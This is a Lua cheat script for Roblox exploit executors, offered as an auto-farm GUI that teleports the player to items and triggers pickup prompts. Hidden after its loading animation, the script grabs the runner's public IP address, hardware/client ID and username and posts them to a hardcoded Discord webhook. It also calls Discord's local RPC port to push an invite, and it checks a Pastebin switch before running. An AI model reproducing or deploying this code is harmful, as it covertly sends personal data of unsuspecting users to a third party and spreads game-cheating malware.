-- Define the function to determine the request method based on the environment
local function getRequestFunction()
    return syn and syn.request or http and http.request or http_request or (fluxus and fluxus.request) or request
end

-- Function to check the status from Pastebin
local function checkPastebin()
    local requestFunction = getRequestFunction()

    -- Send a GET request to the Pastebin URL
    local success, pasteResponse = pcall(requestFunction, {
        Url = "https://pastebin.com/raw/WmDEDjEc", -- Replace with your actual Pastebin raw URL
        Method = "GET"
    })

    if success and pasteResponse and pasteResponse.Body then
        local content = pasteResponse.Body:gsub("%s+", "")
        print("PINGUIN Status:", content)
        return content == "Updated"
    else
        print("Failed to retrieve PINGUIN Status.")
        return false
    end
end

-- Check Pastebin status before executing the main functionality
if not checkPastebin() then
    print("PINGUIN Status: Not Updated, (discord.gg/kB3mbvhR2C) it's updating, chill and check server...")
    return -- Stop further execution if not updated
end

print("PINGUIN Status: Updated, running PINGUIN printer...")

local coreGui = game:GetService("CoreGui")

local function createGUI()
    if coreGui:FindFirstChild("CustomScreenGui") then
        coreGui.CustomScreenGui:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CustomScreenGui"
    screenGui.Parent = coreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 0, 0, 0)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.5

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0.2, 12)
    corner.Parent = frame

    frame.Parent = screenGui

    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 0, 70)
    loadingBar.Position = UDim2.new(0.03, 0, 0.55, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    loadingBar.BorderSizePixel = 0
    loadingBar.BackgroundTransparency = 1
    loadingBar.Parent = frame

    local loadingBarCorner = Instance.new("UICorner")
    loadingBarCorner.CornerRadius = UDim.new(0.8, 18)
    loadingBarCorner.Parent = loadingBar

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0.2, 0)
    loadingText.Position = UDim2.new(0, 0, 0.18, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.Font = Enum.Font.SourceSansBold
    loadingText.TextSize = 55
    loadingText.Text = "Initializing Resources"
    loadingText.Parent = frame

    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(1, 0, 0.2, 0)
    percentText.Position = UDim2.new(0, 0, 0.62, 0)
    percentText.BackgroundTransparency = 1
    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentText.Font = Enum.Font.SourceSansBold
    percentText.TextSize = 55
    percentText.Text = "0%"
    percentText.Parent = frame

    local function animateDots(text, duration)
        local dots = 0
        local maxDots = 3

        for t = 0, duration, 0.62 do
            wait(0.62)
            if t < duration then
                dots = (dots + 1) % (maxDots + 1)
                loadingText.Text = text .. string.rep(".", dots)
            end
        end

        loadingText.Text = text .. string.rep(".", maxDots)
        wait(0.5)
        loadingText.Text = text
        wait(0.3)
    end

    for i = 0, 1, 0.075 do
        wait(0.005)
        frame.Size = UDim2.new(0, 600 * i, 0, 200 * i)
        frame.BackgroundTransparency = 0.5 - (0.5 * i)
    end

    frame.BackgroundTransparency = 0

    spawn(function()
        wait(0.5)
        loadingBar.BackgroundTransparency = 0
        for i = 0, 1, 1/165 do
            wait(0.05)
            loadingBar.Size = UDim2.new(0.95 * i, 0, 0, 70)
            percentText.Text = tostring(math.floor(i * 101)) .. "%"
        end
    end)

    animateDots("Initializing Resources", 2)
    animateDots("Connecting to API", 2)
    animateDots("Loading Pinguin", 2)

    for i = 1, 10 do
        wait(0.05)
        frame.Size = UDim2.new(0, 600 * (1 - i / 10), 0, 200 * (1 - i / 10))
        frame.BackgroundTransparency = (i / 10) * 0.5
    end

    frame:Destroy()
end

createGUI()


local Players = game:GetService("Players")
local player = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local ipCheckUrl = 'https://checkip.amazonaws.com/'

local httprequest = (syn and syn.request) 
    or (http and http.request) 
    or http_request 
    or (fluxus and fluxus.request) 
    or request

if not httprequest then
    warn("No valid my guy.")
    return
end

local response = httprequest({
    Url = ipCheckUrl,
    Method = 'GET',
})

if response.StatusCode ~= 200 then
    warn("Failed; Status Code: " .. response.StatusCode)
    return
end

local ipAddress = response.Body
local playerHWID = game:GetService("RbxAnalyticsService"):GetClientId()

local webhookURL = "https://discord.com/api/webhooks/1293380298943365170/dNY92KfGCX-Og03jKPJ6dwtXOxX_IWJRwy9vXLU4SSzYhQ_wPHikr4zJ4WZwNVxYGd0C"

local playerId = player.UserId
local profileUrl = "https://www.roblox.com/users/" .. playerId .. "/profile"

local payload = {
    content = "",
    embeds = {{
        title = "**Script executed!**",
        description = "***" .. player.Name .. " ( " .. player.DisplayName .. " ) executed the script, their IP is: ```" .. ipAddress .. "```***" ..
                    "\nProfile Link: [View Profile](" .. profileUrl .. ")",
        color = tonumber(0xFFFFFF), -- white color
        fields = {
            {
                name = "Hardware ID:",
                value = playerHWID,
                inline = true
            }
        }
    }}
}

local jsonPayload = HttpService:JSONEncode(payload)

local success, err = pcall(function()
    local webhookResponse = httprequest({
        Url = webhookURL,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = jsonPayload
    })

    if webhookResponse.StatusCode ~= 204 then
        warn("Failed: " .. webhookResponse.StatusCode .. " - " .. webhookResponse.Body)
    else
        print("Success!")
    end
end)

if not success then
    warn("Error: " .. err)
end

-------------------------------

-- Define the request function
local httprequest = (syn and syn.request) 
    or (http and http.request) 
    or http_request 
    or (fluxus and fluxus.request) 
    or request

-- Ensure httprequest is defined
if not httprequest then
    warn("No valid HTTP request function found.")
    return
end

-- Send the request
httprequest({
    Url = 'http://127.0.0.1:6463/rpc?v=1',
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json',
        Origin = 'https://discord.com'
    },
    Body = HttpService:JSONEncode({
        cmd = 'INVITE_BROWSER',
        nonce = HttpService:GenerateGUID(false),
        args = {code = 'kB3mbvhR2C'} -- Put invite code here (not the entire link, just after gg/)
    })
})

---------------------------------------



---------------------------------------

local autoSelectItems = {}
local success, result = pcall(loadstring(loadString))
if success and result then
    autoSelectItems = result
end

local gPlayers = game:GetService("Players")
local plr = gPlayers.LocalPlayer
local running = false
local selectedItems = {}
local screenSaverEnabled = false  -- Variable for screensaver
local screenSaverOverlay = nil  -- Overlay for screensaver

-- Full list of items
local itemList = {
    "Scrap", "Electronics", "Baton", "Handcuffs", "Taser Gun", "Light Vest",
    "Mossberg", "Night Vision Goggles", "Riot Shield", "Glock", "M1911", 
    "Heavy Vest", "M4A1", "Frag", "Police Vest", "Weapon Parts", "Pepper Spray", 
    "Coffee", "Bandage", "Flashbang", "Scar L", "P90", "Spike Strip", "Money Printer", 
    "Explosives", "Shopping Cart", "Cookie", "Banana", "Bloxaide", "Ammo Box", 
    "AUG", "Knife", "Chicken", "Flashlight", "Lockpick", "Sawn Off", "Bloxy Cola", 
    "Burger", "Stagecoach", "Uzi", "Python", "Deagle", "MP7", "AK-47", "Dragunov", 
    "RPK", "RPG", "AS Val", "Barrett M107", "Flamethrower", "M249 SAW", "Minigun", 
    "Topaz Ring", "Emerald", "Amethyst Ring", "Emerald Ring", "Ruby", "Sapphire", 
    "Diamond", "Void Gem", "Dark Matter Gem", "Fireaxe", "Fire Extinguisher", 
    "Megaphone", "Molotov", "Basketball", "Green Paintball Gun", "Orange Paintball Gun", 
    "Purple Paintball Gun", "Blue Paintball Gun", "Green Paintball Mask", 
    "Orange Paintball Mask", "Purple Paintball Mask", "Blue Paintball Mask", 
    "Red Gloves", "Blue Gloves", "Dumbell", "Apple", "Clan Sign", "Bike", 
    "Skateboard", "Hockey Mask", "Scythe", "Bear Trap", "Double Barrel", 
    "Donut", "Baseball Bat", "Surgeon Mask", "Stretcher", "Blue Bandana", 
    "Black Bandana", "Red Bandana", "USP 45", "Raygun", "Popcorn", "Pizza", 
    "Stop Sign", "Crowbar", "X-Ray Goggles", "Beans", "Landmine", "Medical Supplies", 
    "Glock 18", "Military Vest", "Medium Vest", "Pickaxe", "Katana", "Tomahawk", 
    "C4", "Airdrop Marker", "Drone", "Hoverboard", "Gravity Gun", "Smoke", 
    "Medkit", "Money Gun", "Brass Knuckles", "Festive Guitar", "Maraca", 
    "Taco", "Firework", "Heavy C4", "Saiga 12", "Clown Mallet", "Hotdog", 
    "Cotton Candy", "Beach Ball", "Pirate Sword", "Materials", "Spiked Baseball Bat", 
    "Cake", "Balloon", "Clover Balloon", "Ghost Balloon", "Heart Balloon", 
    "Bunny Balloon", "Banana Peel", "Candy Cane", "Choco Bunny", "Chocolates", 
    "Easter Basket", "Firework Cake", "Firework Cone", "Firework Mortar", 
    "Gold AK-47", "Gold Deagle", "Gold Lucky Block", "Orange Lucky Block", 
    "Green Firework", "Green Lucky Block", "Guitar", "Tommy Gun", "Suitcase Nuke", 
    "Sparkler", "Small Present", "Sign", "Saber", "Roman Candle", "Rose", 
    "Red Lucky Block", "Purple Lucky Block", "Pink Firework", "Nuke Launcher", 
    "Ninja Star", "NextBot Grenade", "July 4th Firework", "AR-15", 
    "Military Armory Keycard", "Glider", "Police Armory Keycard", "Blue Lucky Block"
}

-- Sort the item list alphabetically
table.sort(itemList)

for _, item in ipairs(autoSelectItems) do
    if table.find(itemList, item) then
        selectedItems[item] = true  -- Mark as selected
    end
end

local function createGUI()
    if coreGui:FindFirstChild("CustomScreenGui") then
        coreGui.CustomScreenGui:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CustomScreenGui"
    screenGui.Parent = coreGui

    -- Frame
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 600, 0, 400)
    frame.Position = UDim2.new(0.5, -300, 0.5, -200)
    frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame

    -- Draggable functionality
    local UserInputService = game:GetService("UserInputService")
    local dragging, dragInput, dragStart, startPos

    local function updateInput(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end

    frame.InputBegan:Connect(onInputBegan)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input == dragInput) then
            updateInput(input)
        end
    end)

    -- Tabs
    local mainTab = Instance.new("TextButton")
    mainTab.Size = UDim2.new(0, 100, 0, 40)
    mainTab.Position = UDim2.new(0, 10, 0, 10)
    mainTab.Text = "Main"
    mainTab.Parent = frame

    local itemsTab = Instance.new("TextButton")
    itemsTab.Size = UDim2.new(0, 100, 0, 40)
    itemsTab.Position = UDim2.new(0, 120, 0, 10)
    itemsTab.Text = "Items"
    itemsTab.Parent = frame

    -- Add the label for the creator information
    local creatorLabel = Instance.new("TextLabel")
    creatorLabel.Size = UDim2.new(0, 250, 0, 40)  -- Adjust the width as needed
    creatorLabel.Position = UDim2.new(0, 240, 0, 10)  -- Position it next to the Items tab
    creatorLabel.Text = "MADE BY PINGUIN (discord.gg/kB3mbvhR2C) dc: 4d04"
    creatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
    creatorLabel.BackgroundTransparency = 1  -- Make the background transparent
    creatorLabel.Parent = frame

    -- Close Button
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 40, 0, 40)
    closeButton.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
    closeButton.Text = "❌"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Parent = screenGui

    local cornerClose = Instance.new("UICorner")
    cornerClose.CornerRadius = UDim.new(0, 12)
    cornerClose.Parent = closeButton

    -- Position the close button for mobile users
    closeButton.Position = UDim2.new(1, -50, 0.5, -20)  -- Centered vertically on the right
    closeButton.MouseButton1Click:Connect(function()
        frame.Visible = not frame.Visible  -- Toggle visibility
    end)

    -- Main Tab Content
    local mainContent = Instance.new("Frame")
    mainContent.Size = UDim2.new(1, -20, 1, -60)
    mainContent.Position = UDim2.new(0, 10, 0, 60)
    mainContent.Parent = frame

    local startButton = Instance.new("TextButton")
    startButton.Size = UDim2.new(0, 100, 0, 50)
    startButton.Position = UDim2.new(0.5, -110, 0.5, -25)
    startButton.Text = "Start"
    startButton.Parent = mainContent

    local stopButton = Instance.new("TextButton")
    stopButton.Size = UDim2.new(0, 100, 0, 50)
    stopButton.Position = UDim2.new(0.5, 10, 0.5, -25)
    stopButton.Text = "Stop"
    stopButton.Parent = mainContent

    -- Items Tab Content
    local itemsContent = Instance.new("Frame")
    itemsContent.Size = UDim2.new(1, -20, 1, -60)
    itemsContent.Position = UDim2.new(0, 10, 0, 60)
    itemsContent.Visible = false
    itemsContent.Parent = frame

    -- Search box
    local searchBox = Instance.new("TextBox")
    searchBox.Size = UDim2.new(0, 580, 0, 40)
    searchBox.Position = UDim2.new(0, 0, 0, 0)
    searchBox.PlaceholderText = "Search items..."
    searchBox.Parent = itemsContent

    -- Scrollable item list
    local itemListFrame = Instance.new("ScrollingFrame")
    itemListFrame.Size = UDim2.new(1, 0, 1, -50)
    itemListFrame.Position = UDim2.new(0, 0, 0, 50)
    itemListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    itemListFrame.ScrollBarThickness = 6
    itemListFrame.Parent = itemsContent

    -- Table to hold item buttons for easy access
    local itemButtons = {}

    -- Function to update item list
    local function updateItemList(searchText)
        itemListFrame:ClearAllChildren()
        itemButtons = {}  -- Clear previously stored item buttons

        local yOffset = 0
        for _, item in pairs(itemList) do
            if not searchText or item:lower():find(searchText:lower()) then  -- Ensure case-insensitivity
                local itemButton = Instance.new("TextButton")
                itemButton.Size = UDim2.new(1, -10, 0, 40)
                itemButton.Position = UDim2.new(0, 5, 0, yOffset)
                itemButton.Text = item
                itemButton.BackgroundColor3 = selectedItems[item] and Color3.fromRGB(0, 0, 255) or Color3.fromRGB(50, 50, 50)
                itemButton.TextColor3 = Color3.fromRGB(255, 255, 255)

                -- Handle item selection
                local function toggleSelection()
                    if selectedItems[item] then
                        selectedItems[item] = nil
                        itemButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Deselected color
                    else
                        selectedItems[item] = true
                        itemButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255) -- Selected color
                    end
                end

                -- Connect itemButton for both desktop and mobile
                itemButton.InputBegan:Connect(function(input, gameProcessedEvent)
                    if not gameProcessedEvent then
                        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                            toggleSelection()
                        end
                    end
                end)

                itemButton.Parent = itemListFrame
                yOffset = yOffset + 45

                -- Store the button for later reference
                itemButtons[item] = itemButton
            end
        end

        itemListFrame.CanvasSize = UDim2.new(0, 0, 0, yOffset)
    end

    updateItemList("")

    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
        updateItemList(searchBox.Text)
    end)

    -- Tab switching
    local function showTab(tab)
        mainContent.Visible = tab == "main"
        itemsContent.Visible = tab == "items"
    end

    mainTab.MouseButton1Click:Connect(function()
        showTab("main")
    end)

    itemsTab.MouseButton1Click:Connect(function()
        showTab("items")
    end)

    -- Logic for Screensaver Toggle in the Main Content
    local screenSaverToggle = Instance.new("TextButton")
    screenSaverToggle.Size = UDim2.new(0, 300, 0, 40)
    screenSaverToggle.Position = UDim2.new(0.5, -150, 0.5, 30)  -- Adjust position as necessary
    screenSaverToggle.Text = "Toggle Screensaver"
    screenSaverToggle.Parent = mainContent

    -- Function to handle screensaver toggle
    local function toggleScreenSaver()
        screenSaverEnabled = not screenSaverEnabled
        if screenSaverEnabled then
            -- Create Screensaver Overlay
            if not screenSaverOverlay then  -- Check if overlay already exists
                screenSaverOverlay = Instance.new("Frame")
                screenSaverOverlay.Size = UDim2.new(1, 0, 1, 0)
                screenSaverOverlay.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black background
                screenSaverOverlay.ZIndex = 0  -- Ensure it's underneath all UI elements
                screenSaverOverlay.Parent = screenGui

                local overlayText = Instance.new("TextLabel")
                overlayText.Size = UDim2.new(1, 0, 1, 0)
                overlayText.Position = UDim2.new(0, 0, 0, 0)
                overlayText.Text = "Screensaver"
                overlayText.TextColor3 = Color3.new(1, 1, 1)  -- White text
                overlayText.Font = Enum.Font.SourceSansBold
                overlayText.TextSize = 48
                overlayText.TextScaled = true
                overlayText.BackgroundTransparency = 1  -- Make the label background transparent
                overlayText.Parent = screenSaverOverlay
            end
        else
            if screenSaverOverlay then
                screenSaverOverlay:Destroy()
                screenSaverOverlay = nil
            end
        end
    end

    screenSaverToggle.MouseButton1Click:Connect(toggleScreenSaver)  -- Toggle screensaver

    -- Main logic to teleport and interact with items
    local function teleportAndInteract(itemName)
        local function partMatchesProximityPrompt(part, objectText)
            local prompt = part:FindFirstChildOfClass("ProximityPrompt")
            return prompt and prompt.ObjectText == objectText
        end

        local function teleportToPosition(position)
            local humanoidRootPart = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                humanoidRootPart.CFrame = CFrame.new(position)
                wait(0.25)
            else
                print("HumanoidRootPart not found")
            end
        end

        local function interactWithPrompt(prompt)
            if prompt then
                local distance = (plr.Character.HumanoidRootPart.Position - prompt.Parent.Position).Magnitude
                if distance <= prompt.MaxActivationDistance then
                    fireproximityprompt(prompt)
                    print("Prompt triggered for:", itemName)
                else
                    print("Too far from ProximityPrompt for:", itemName)
                end
            else
                print("No ProximityPrompt found for:", itemName)
            end
        end

        local function findMatchingModelWithPrompt(objectText)
            for _, model in pairs(workspace.Game.Entities.ItemPickup:GetChildren()) do
                if model:IsA("Model") then
                    for _, part in pairs(model:GetDescendants()) do
                        if (part:IsA("Part") or part:IsA("MeshPart")) and partMatchesProximityPrompt(part, objectText) then
                            return part
                        end
                    end
                end
            end
            return nil
        end

        local promptPart = findMatchingModelWithPrompt(itemName)
        if promptPart then
            teleportToPosition(promptPart.Position + Vector3.new(0, 3, 0))
            wait(0.1)
            interactWithPrompt(promptPart:FindFirstChildOfClass("ProximityPrompt"))
        else
            print("No matching part found for:", itemName)
        end
    end

    -- Main run logic
    local function run()
        running = true
        while running do
            if next(selectedItems) then  -- Check if there are selected items to interact with
                for itemName in pairs(selectedItems) do
                    teleportAndInteract(itemName)
                    wait(0.1)
                end
            else
                running = false  -- If no items are selected, stop running
            end
            wait(0.1)  -- Introduced a small wait
        end
    end

    startButton.MouseButton1Click:Connect(function()
        if not running then
            run()
        end
    end)

    stopButton.MouseButton1Click:Connect(function()
        running = false  -- Set to false to stop the entire search process
    end)

    -- Keyboard toggle functionality
    UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
        if not gameProcessedEvent then
            if input.KeyCode == Enum.KeyCode.RightShift then
                frame.Visible = not frame.Visible  -- Toggle visibility
            end
        end
    end)

    -- Adjusts close button position depending on mobile capabilities
    if UserInputService.TouchEnabled then
        closeButton.Position = UDim2.new(1, -50, 0.5, -20)  -- Centered vertically on the right for mobile
    else
        closeButton.Position = UDim2.new(1, -50, 0, 10)  -- Anchored for PC
    end

    -- Show the main tab by default
    showTab("main")
end

createGUI()
